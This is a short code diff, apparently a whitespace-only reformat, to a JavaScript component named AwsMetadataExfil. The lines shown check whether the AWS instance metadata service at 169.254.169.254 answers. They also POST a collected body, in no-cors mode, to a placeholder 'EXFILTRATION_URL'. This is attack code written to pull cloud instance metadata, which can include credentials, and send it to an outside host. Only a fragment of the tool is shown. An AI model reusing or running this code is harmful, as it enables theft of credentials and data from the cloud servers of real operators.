@@ -28,14 +28,14 @@ const AwsMetadataExfil = () => {
         };
 
         let EXFILTRATION_URL = "http://xxxx.xxx:xxxxx/";
-            fetch(EXFILTRATION_URL, {
-                method: 'POST',
-                mode: "no-cors",
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                },
-                body: body
-            });
+        fetch(EXFILTRATION_URL, {
+            method: 'POST',
+            mode: "no-cors",
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+            },
+            body: body
+        });
 
     }
 
@@ -44,7 +44,7 @@ const AwsMetadataExfil = () => {
     async function isService(headers, cookie, body) {
         return fetch("http://169.254.169.254/latest/meta-data/")
             .then(response => {
-                    return true;
+                return true;
             })
             .catch(e => { return (false); })
     }
